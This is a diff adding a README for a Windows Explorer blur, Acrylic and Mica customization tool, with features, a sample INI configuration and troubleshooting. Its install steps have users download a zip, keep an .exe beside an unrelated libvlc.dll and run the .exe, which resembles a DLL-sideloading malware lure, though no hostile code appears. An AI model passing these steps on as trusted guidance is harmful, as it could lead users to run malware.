@@ -1,0 +1,151 @@
+Windows Explorer Blur & Mica is a free, open-source Windows desktop customization tool that transforms the appearance of File Explorer with modern Acrylic, Mica, transparency, and background blur effects. Designed for Windows 10 and Windows 11 users, it brings a more refined desktop experience without requiring command-line interaction for everyday customization.
+
+⬇️ Installation
+
+Download the Windows application
+
+1. Open the repository's Releases page.
+2. Download the latest release archive Windows Explorer Blur & Mica 4.4.0.zip.
+3. Extract the archive into a folder of your choice.
+4. Keep Windows Explorer Blur & Mica 4.4.0.exe and libvlc.dll together in that folder.
+5. Double-click Windows Explorer Blur & Mica 4.4.0.exe to launch the application.
+
+✨ Features
+
+- 🌫️ Background Blur Effects — Add a modern blurred background to Windows File Explorer for a cleaner, more immersive interface.
+- 🪟 Windows 11 Mica Material — Apply native-inspired Mica and Mica Alt visual effects to supported Windows 11 Explorer windows.
+- 💎 Acrylic Transparency — Enable translucent Acrylic surfaces with customizable background blending and opacity.
+- 🎨 Custom Blend Colors — Adjust red, green, blue, and alpha values to create personalized Explorer backgrounds.
+- 🌗 Automatic Theme Adaptation — Configure different appearance settings for Windows light mode and dark mode.
+- 🧩 Windows 10 & 11 Support — Customize File Explorer across supported Windows versions with effects suited to each system.
+- 🔧 Explorer Customization Compatibility — Designed to work alongside popular Explorer interface modifications, alternative themes, and shell customization utilities.
+
+🖼️ Overview
+
+Windows Explorer Blur & Mica focuses on improving the visual appearance of Windows File Explorer while preserving its familiar functionality.
+
+Available visual effects
+
+| Effect | Description | Platform |
+|---|---|---|
+| Background Blur | Soft blurred window backgrounds | Windows 10 / 11 |
+| Acrylic | Translucent material with color blending | Windows 10 / 11 |
+| Mica | Windows 11-inspired desktop material | Windows 11 |
+| Mica Alt | Alternative Mica appearance | Supported Windows 11 builds |
+| Clear Blur | Simplified transparent blur appearance | Windows 10 / 11 |
+
+Personalization options
+
+- Separate color configurations for light and dark themes.
+- Adjustable transparency through alpha blending.
+- Explorer toolbar background customization.
+- Address bar background transparency.
+- Optional background adjustments for supported WinUI and XAML Islands interfaces.
+
+Compatibility note: Available effects depend on your Windows version, Explorer interface, and system build. Some material effects are exclusive to Windows 11, while other blur styles support both Windows 10 and Windows 11.
+
+🚀 Usage
+
+1. Choose your visual style — Decide whether you prefer Acrylic transparency, background blur, or Windows 11 Mica.
+2. Configure the appearance — Adjust your preferred effect, colors, opacity, and light/dark theme settings.
+3. Apply the customization — Activate the Explorer integration using the supplied release package.
+4. Refresh File Explorer — Reopen Explorer windows to see the updated appearance.
+5. Fine-tune your desktop — Experiment with different colors and transparency values until the interface matches your preferred Windows theme.
+
+⚙️ Configuration reference
+
+The customization settings support an INI-style configuration structure.
+
+| Setting | Purpose |
+|---|---|
+| effect | Selects the supported background material |
+| clearAddress | Controls address bar background styling |
+| clearBarBg | Adjusts toolbar and scrollbar backgrounds |
+| clearWinUIBg | Controls supported WinUI background styling |
+| r, g, b | Defines the background blend color |
+| a | Controls transparency and opacity |
+
+Example configuration:
+
+[config]
+effect=1
+clearAddress=true
+clearBarBg=true
+clearWinUIBg=true
+
+[light]
+r=255
+g=255
+b=255
+a=200
+
+[dark]
+r=30
+g=30
+b=30
+a=180
+
+The available configuration options and their behavior may vary depending on the Windows version and Explorer implementation.
+
+🖥️ Supported environments
+
+| Environment | Support |
+|---|---|
+| Windows 10 | Supported blur and Acrylic configurations |
+| Windows 11 | Supported blur, Acrylic, and Mica configurations |
+| Windows 11 light theme | Configurable appearance |
+| Windows 11 dark theme | Configurable appearance |
+| Modified Explorer interfaces | Compatibility depends on the modification |
+
+🔒 Security
+
+Your desktop customization should remain transparent and under your control.
+
+- Open-source software — Review the source code and understand how the Explorer customization works.
+- No telemetry or tracking — No analytics or behavioral tracking is required for the intended customization features.
+- Local configuration — Appearance preferences are managed through local configuration files.
+- System integration awareness — The application interacts with Windows Explorer, so use trusted release packages and understand the permissions requested during activation.
+- Responsible issue reporting — Report reproducible bugs, compatibility problems, and unexpected Explorer behavior through GitHub Issues.
+
+Troubleshooting
+
+Explorer does not display the selected effect
+
+- Check whether the selected effect is supported by your Windows build.
+- Verify that the configuration file contains valid values.
+- Restart Explorer after applying configuration changes.
+
+The appearance differs between light and dark modes
+
+- Review the separate theme color settings.
+- Check the alpha value and blend colors.
+- Confirm that Windows theme settings have been updated.
+
+Explorer becomes unstable after customization
+
+- Restore the previous configuration or disable the Explorer integration.
+- Use the supplied removal procedure from the release package.
+- Report the Windows version, system build, and relevant configuration details when opening an issue.
+
+Third-party Explorer modifications cause conflicts
+
+- Test compatibility with other shell customization utilities.
+- Temporarily disable conflicting Explorer modifications to isolate the problem.
+
+🤝 Contributing
+
+Contributions from Windows customization enthusiasts and C++ developers are welcome.
+
+You can help improve the project by:
+
+- Reporting bugs and Windows compatibility issues.
+- Suggesting additional visual effects and customization options.
+- Improving configuration documentation.
+- Submitting code improvements and tested fixes.
+- Sharing reproducible results across Windows 10 and Windows 11 builds.
+
+Please include your Windows edition, version, build number, and relevant configuration details when submitting technical reports.
+
+📄 License
+
+Distributed under the GNU Lesser General Public License v3.0 (LGPL-3.0). See the project license file for complete terms and conditions.
